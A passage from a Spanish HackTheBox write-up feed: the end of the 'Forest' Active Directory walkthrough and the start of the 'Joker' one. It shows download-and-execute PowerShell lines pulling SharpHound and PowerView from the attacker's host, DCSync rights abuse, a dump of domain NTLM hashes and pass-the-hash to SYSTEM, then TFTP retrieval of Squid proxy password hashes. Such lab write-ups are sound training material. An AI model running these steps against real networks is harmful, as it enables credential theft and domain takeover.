SMB         10.10.10.161    5985   FOREST           [*] Windows 10.0 Build 14393 (name:FOREST) (domain:htb.local)
HTTP        10.10.10.161    5985   FOREST           [*] http://10.10.10.161:5985/wsman
WINRM       10.10.10.161    5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos conectamos al servicio, despues nos dirigimos al directorio personal del usuario &lt;code&gt;svc-alfresco&lt;/code&gt; y podemos visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
Evil-WinRM* PS C:\Users\svc-alfresco\Documents&amp;gt; whoami
htb\svc-alfresco
Evil-WinRM* PS C:\Users\svc-alfresco\Documents&amp;gt; cd ..\Desktop
Evil-WinRM* PS C:\Users\svc-alfresco\Desktop&amp;gt; type user.txt
a5bdfec1b06f0a66536a4227d3dfc27d
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;elevacion-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#elevacion-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Como nos enfrentamos a un &lt;code&gt;DC&lt;/code&gt; vamos a usar &lt;code&gt;BloodHound&lt;/code&gt; para tratar de enumerar vias potenciales para elevar nuestros privilegios.&lt;/p&gt;

&lt;p&gt;Para instalarlos solo debemos ejecutar:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;apt install neo4j, bloodhound -y
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si tienes problemas con la instalación puedes instalar una versión especifica de &lt;code&gt;neo4j&lt;/code&gt; de:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://debian.neo4j.com/&quot;&gt;https://debian.neo4j.com/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;y puedes descargar un release de &lt;code&gt;bloodhound&lt;/code&gt; directamente del repositorio de github:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/BloodHoundAD/BloodHound/releases&quot;&gt;BloodHound - releases&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Una vez instalado ejecuta el comando &lt;code&gt;neo4j console&lt;/code&gt; y te desplegara el servicio web en el puerto 7474, entras al servicio con las credenciales por defecto &lt;code&gt;neo4j:no4oj&lt;/code&gt; y te pedira cambies la contraseña por defecto a la que desees.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ neo4j console
Starting Neo4j.
2023-10-11 20:21:29.970+0000 INFO  Starting...
2023-10-11 20:21:30.757+0000 INFO  This instance is ServerId{379de84c} (379de84c-82dc-4a72-beab-b327d0181e30)
2023-10-11 20:21:33.391+0000 INFO  ======== Neo4j 4.4.26 ========
2023-10-11 20:21:36.106+0000 INFO  Initializing system graph model for component 'security-users' with version -1 and status UNINITIALIZED
2023-10-11 20:21:36.659+0000 INFO  Bolt enabled on localhost:7687.
2023-10-11 20:21:37.946+0000 INFO  Remote interface available at http://localhost:7474/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Forest/forest1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Estas credenciales seran la que usaras para logearte al abrir &lt;code&gt;Bloodhound&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Forest/forest2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora descargaremos el script de powershell &lt;code&gt;sharphound.ps1&lt;/code&gt; que se va a encargar de recolectar toda la información del equipo en un archivo comprimido, el cual subiremos al &lt;code&gt;bloodhound&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1&quot;&gt;SharpHound.ps1&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Subimos el script y lo interpretamos con &lt;code&gt;Iex&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Evil-WinRM* PS C:\Users\svc-alfresco\Desktop&amp;gt; mkdir bloodhound

    Directory: C:\Users\svc-alfresco\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/11/2023   2:46 PM                bloodhound


Evil-WinRM* PS C:\Users\svc-alfresco\Desktop&amp;gt; cd bloodhound
Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&amp;gt; Iex(New-Object Net.WebClient).downloadString('http://10.10.16.10/SharpHound.ps1')
Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&amp;gt; Invoke-BloodHound -CollectionMethod All
Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&amp;gt; dir

    Directory: C:\Users\svc-alfresco\Desktop\bloodhound

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/11/2023   2:48 PM          15433 20231011144852_BloodHound.zip
-a----       10/11/2023   2:48 PM          23725 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos traemos el archivo a nuestro equipo y lo importamos en el &lt;code&gt;Bloodhound&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&amp;gt; download C:\Users\svc-alfresco\Desktop\bloodhound\20231011144852_BloodHound.zip
                                        
Info: Downloading C:\Users\svc-alfresco\Desktop\bloodhound\20231011144852_BloodHound.zip to 20231011144852_BloodHound.zip
                                        
Info: Download successful!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Le asignamos un nombre mas descriptivo al comprimido.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
 20231011144852_BloodHound.zip   hash   SharpHound.ps1   users
❯ mv 20231011144852_BloodHound.zip bh_data.zip
❯ ls
 bh_data.zip   hash   SharpHound.ps1   users
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora lo subimos al &lt;code&gt;BloodHound&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Forest/forest3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como comprometimos al usuario &lt;code&gt;svc-alfresco&lt;/code&gt; vamos a marcarlo como comprometido.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Forest/forest4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que el usuario alfresco esta dentro del grupo &lt;code&gt;Account Operators&lt;/code&gt; y este tiene el privilegio &lt;code&gt;GenericAll&lt;/code&gt; sobre &lt;code&gt;Exchange Windows Permissions&lt;/code&gt;, que a su vez tiene &lt;code&gt;WriteDacl&lt;/code&gt; sobre &lt;code&gt;htb.local&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Forest/forest5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Estando dentro del grupo &lt;code&gt;Account Operators&lt;/code&gt; podemos crear un usuario e incorporarlo en nuevos grupos. Por lo que vamos a crear un usuario y lo agregaremos al grupo &lt;code&gt;Exchange Windows Permissions&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&amp;gt; net user fmiracle fmiracle123$! /add /domain
The command completed successfully.

Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&amp;gt; net group &quot;Exchange Windows Permissions&quot; fmiracle /add
The command completed successfully.
Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&amp;gt; net user fmiracle
User name                    fmiracle
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/11/2023 3:29:16 PM
Password expires             Never
Password changeable          10/12/2023 3:29:16 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Exchange Windows Perm*Domain Users
The command completed successfully.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora que estamos dentro este grupo podemos aprovecharnos del privilegio &lt;code&gt;WriteDacl&lt;/code&gt; y ejecutar un &lt;code&gt;Dcsync Attack&lt;/code&gt;, para ello ejecutamos los siguientes comandos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&amp;gt; $SecPassword = ConvertTo-SecureString 'fmiracle123$!' -AsPlainText -Force
Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&amp;gt; $Cred = New-Object System.Management.Automation.PSCredential('htb.local\fmiracle', $SecPassword)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues vamos a descargarnos e importar el modulo de &lt;code&gt;PowerView.ps1&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1&quot;&gt;PowerView.ps1&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.161 - - [11/Oct/2023 17:32:48] &quot;GET /PowerView.ps1 HTTP/1.1&quot; 200 -
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&amp;gt; Iex(New-Object Net.WebClient).downloadString('http://10.10.16.10/PowerView.ps1')
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Finalmente ejecutamos la función &lt;code&gt;Add-DomainObjectAcl&lt;/code&gt; del &lt;code&gt;PowerView.ps1&lt;/code&gt; que importamos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bloodhound&amp;gt; Add-DomainObjectAcl -Credential $Cred -TargetIdentity &quot;DC=htb, DC=local&quot; -PrincipalIdentity fmiracle -Rights DCSync
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y ahora en nuestro equipo podemos usar &lt;code&gt;secretdump&lt;/code&gt; usando las credenciales del usuario &lt;code&gt;fmiracle&lt;/code&gt; y podemos dumpearnos todos los hashes del dominio.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ secretsdump.py htb.local/fmiracle@10.10.10.161
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denid
[*] Dumping Domain Credentials 
[*] Using the DRSUAPI method to get NTDS.DIT secret
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Aplicamos &lt;code&gt;pass the hash&lt;/code&gt; con &lt;code&gt;psexec.py&lt;/code&gt; para conectarnos como el usuario &lt;code&gt;Administrator&lt;/code&gt;, nos dirigimos al directorio personal del usuario y podemos visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ psexec.py htb.local/Administrator@10.10.10.161 -hashes :32693b11e6aa90eb43d32c72a07ceea6
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.10.161.....
[*] Found writable share ADMIN$
[*] Uploading file bUDVoWTk.exe
[*] Opening SVCManager on 10.10.10.161.....
[*] Creating service jeFE on 10.10.10.161.....
[*] Starting service jeFE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32&amp;gt; whoami
nt authority\system

C:\Windows\system32&amp;gt; cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop&amp;gt; type root.txt
84831d87fd5fe84052c8fb99dd4b9c5
&lt;/code&gt;&lt;/pre&gt;
</description>
        <pubDate>Wed, 11 Oct 2023 00:00:00 -0500</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Forest</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Forest</guid>
        
        <category>RPC Enumeration</category>
        
        <category>AS-RepRoast attack</category>
        
        <category>Cracking Hashes</category>
        
        <category>Abusing WinRM</category>
        
        <category>BloodHound Enumeration</category>
        
        <category>Gathering system information</category>
        
        <category>Abusing Account Operators Group</category>
        
        <category>Abusing WriteDacl</category>
        
        <category>DCSync Exploitation</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Joker - htb writeup</title>
        <description>&lt;p&gt;El dia de hoy vamos a resolver &lt;code&gt;Joker&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina &lt;code&gt;linux&lt;/code&gt; de dificultad hard. Para poder comprometer esta maquina realizaremos la enumeración de un &lt;code&gt;squid proxy&lt;/code&gt; a traves del servicio &lt;code&gt;tftp&lt;/code&gt; del protocolo &lt;code&gt;udp&lt;/code&gt;, en donde obtenedremos unas credenciales que nos permitiran conectarnos a un servicio de consola donde podamos obtener ejecuciòn remota de comandos, evadiendo reglas &lt;code&gt;iptables&lt;/code&gt; definidas; despues nos aprovecharemos de un privilegio de sudoers muy interesante para migrar a un usuario con mayores privilegios y finalmente veremos el riesgo de usar wildcards en tareas programadas que nos permitiran ganar acceso como el usuario &lt;code&gt;root&lt;/code&gt; y obtener acceso total al sistema.&lt;/p&gt;

&lt;p&gt;Maquina bastante guapa asi que a darle!.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Joker
❯ ls

 Joker
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.21
PING 10.10.10.21 (10.10.10.21) 56(84) bytes of data.
64 bytes from 10.10.10.21: icmp_seq=1 ttl=63 time=106 ms

--- 10.10.10.21 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 105.889/105.889/105.889/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;63&lt;/code&gt; y por proximidad seria correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;ESCANEO DE PUERTOS&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vv -n -Pn 10.10.10.21 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-25 23:25 GMT
Initiating SYN Stealth Scan at 23:25
Scanning 10.10.10.21 [65535 ports]
Discovered open port 22/tcp on 10.10.10.21
Discovered open port 3128/tcp on 10.10.10.21
Completed SYN Stealth Scan at 23:25, 26.44s elapsed (65535 total ports)
Nmap scan report for 10.10.10.21
Host is up, received user-set (0.12s latency).
Scanned at 2023-08-25 23:25:26 GMT for 26s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
3128/tcp open  squid-http syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.53 seconds
           Raw packets sent: 131087 (5.768MB) | Rcvd: 21 (924B)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;ESCANEO DE VERSION Y SERVICIOS&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,3128 10.10.10.21 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-25 23:26 GMT
Nmap scan report for 10.10.10.21
Host is up (0.13s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 88:24:e3:57:10:9f:1b:17:3d:7a:f3:26:3d:b6:33:4e (RSA)
|   256 76:b6:f6:08:00:bd:68:ce:97:cb:08:e7:77:69:3d:8a (ECDSA)
|_  256 dc:91:e4:8d:d0:16:ce:cf:3d:91:82:09:23:a7:dc:86 (ED25519)
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/3.5.12
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.63 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Visulizamos información interesante de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;SSH&lt;/td&gt;
      &lt;td&gt;OpenSSH 7.3p1 Ubuntu 1ubuntu0.1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;3128&lt;/td&gt;
      &lt;td&gt;SQUID-HTTP&lt;/td&gt;
      &lt;td&gt;http-proxy Squid&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotacion&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotacion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzamos abriendo nuestro navegador y observamos el servicio correspondiente al puerto &lt;code&gt;3128&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Joker/joker1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como vemos que se trata de un &lt;code&gt;squid proxy&lt;/code&gt; podemos apoyarnos de nuestra extensión &lt;code&gt;foxy proxy&lt;/code&gt; para agregar el proxy correspondiente a la maquina victima y asi intentar ver si al pasar con este nos muestra un contenido distinto.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Joker/joker2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que aun no podemos visualizar el contenido y que el servicio se queda cargando sin responder.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Joker/joker3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora como vemos que se encuentra activo el &lt;code&gt;squid proxy&lt;/code&gt; podemos intentar pasar a traves de este y intentar descubrir puertos internos de la maquina con la ayuda de &lt;code&gt;wfuzz&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c --hc=404 -t 20 --hh=3576 --hw=400 -z range,0-65535 -p 10.10.10.21:3128:HTTP -u http://localhost:FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://localhost:FUZZ/
Total requests: 65536

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000000001:   400        151 L    416 W      3550 Ch     &quot;0&quot;                                                                                                                   
000000022:   407        144 L    393 W      3590 Ch     &quot;21&quot;                                                                                                                  
000000071:   407        144 L    393 W      3590 Ch     &quot;70&quot;                                                                                                                  
000000211:   407        144 L    393 W      3594 Ch     &quot;210&quot;                                                                                                                 
000000281:   407        144 L    393 W      3594 Ch     &quot;280&quot;                                                                                                                 
000000489:   407        144 L    393 W      3594 Ch     &quot;488&quot;                                                                                                                 
000000444:   407        144 L    393 W      3594 Ch     &quot;443&quot;                                                                                                                 
000000592:   407        144 L    393 W      3594 Ch     &quot;591&quot;                                                                                                                 
000000778:   407        144 L    393 W      3594 Ch     &quot;777&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;La herramienta nos reporta algunos posibles puertos que se encuentren activo de manera local, pero vimos que con &lt;code&gt;nmap&lt;/code&gt; estos no se mostraban. Ahora si bien es cierto el puerto &lt;code&gt;21&lt;/code&gt; no se encuentra externamente abierto, pero si consideramos los puertos por &lt;code&gt;UDP&lt;/code&gt; tenemos al servicio &lt;code&gt;tftp&lt;/code&gt; en el puerto &lt;code&gt;69&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Si ahora tratamos con &lt;code&gt;nmap&lt;/code&gt; de enumerar el puerto 69 por &lt;code&gt;udp&lt;/code&gt; este se encuentra en esta &lt;code&gt;filtered&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ nmap -p69 -sU 10.10.10.21 -n -v
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-25 23:44 GMT
Initiating Ping Scan at 23:44
Scanning 10.10.10.21 [4 ports]
Completed Ping Scan at 23:44, 0.12s elapsed (1 total hosts)
Initiating UDP Scan at 23:44
Scanning 10.10.10.21 [1 port]
Completed UDP Scan at 23:44, 1.09s elapsed (1 total ports)
Nmap scan report for 10.10.10.21
Host is up (0.11s latency).

PORT   STATE         SERVICE
69/udp open|filtered tftp

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.34 seconds
           Raw packets sent: 6 (246B) | Rcvd: 4 (162B)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Probamos a conectarnos al servicio y al intentar extraer alguna información nos responde con un mensjae de violación.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ tftp 10.10.10.21
tftp&amp;gt; get /etc/passwd
Error code 2: Access violation
tftp&amp;gt; get /etc/
Error code 2: Access violation
tftp&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como ya previamente sabemos que se esta ejecutando el servicio de &lt;code&gt;squid proxy&lt;/code&gt;, podemos intentar traernos el archivo de configuración, que por defecto se encuentra en la ruta
&lt;code&gt;/etc/squid/squid.conf&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ tftp 10.10.10.21
tftp&amp;gt; get /etc/squid/squid.conf
Received 295428 bytes in 66.4 seconds
tftp&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Conseguimos traernos el archivo y si ahora lo cateamos vemos un contenido interesante.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
 squid.conf
❯ /bin/cat squid.conf | grep -v &quot;^#&quot; | sed '/^\s*$/d'
acl SSL_ports port 443
acl Safe_ports port 80		# http
acl Safe_ports port 21		# ftp
acl Safe_ports port 443		# https
acl Safe_ports port 70		# gopher
acl Safe_ports port 210		# wais
acl Safe_ports port 1025-65535	# unregistered ports
acl Safe_ports port 280		# http-mgmt
acl Safe_ports port 488		# gss-http
acl Safe_ports port 591		# filemaker
acl Safe_ports port 777		# multiling http
acl CONNECT method CONNECT
http_access deny !Safe_ports
http_access deny CONNECT !SSL_ports
http_access deny manager
auth_param basic program /usr/lib/squid/basic_ncsa_auth /etc/squid/passwords
auth_param basic realm kalamari
acl authenticated proxy_auth REQUIRED
http_access allow authenticated
http_access deny all
http_port 3128
coredump_dir /var/spool/squid
refresh_pattern ^ftp:		1440	20%	10080
refresh_pattern ^gopher:	1440	0%	1440
refresh_pattern -i (/cgi-bin/|\?) 0	0%	0
refresh_pattern (Release|Packages(.gz)*)$      0       20%     2880
refresh_pattern .		0	20%	4320
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos observar una ruta que contiene contraseñas, asi que vamos a proceder a traernos el archivo y obtenemos unas credenciales hasheadas.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ tftp 10.10.10.21
tftp&amp;gt; get /etc/squid/passwords
Received 48 bytes in 0.1 seconds
❯ /bin/cat passwords
kalamari:$apr1$zyzBxQYW$pL360IoLQ5Yum5SLTph.l0
&lt;/code&gt;&lt;/pre&gt;

